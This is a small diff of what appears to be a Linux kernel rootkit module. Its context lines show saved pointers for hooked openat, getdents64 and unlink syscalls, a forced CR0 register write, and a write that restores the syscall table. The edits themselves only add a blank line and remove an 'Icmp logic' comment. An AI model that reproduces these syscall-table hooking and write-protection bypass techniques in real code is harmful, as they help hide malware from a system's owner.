@@ -102,6 +102,7 @@ static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
 static syscall_wrapper orig_unlink;
 
+
 static inline void write_forced_cr0(unsigned long value)
 {
     unsigned long __force_order;
@@ -341,8 +342,6 @@ static void restore_unlink(void)
     /* Restore syscall table */
     __sys_call_table_addr[__NR_unlink] = (unsigned long)orig_unlink;
 }
-
-// Icmp logic
 
 static void work_handler(struct work_struct * work)
 {
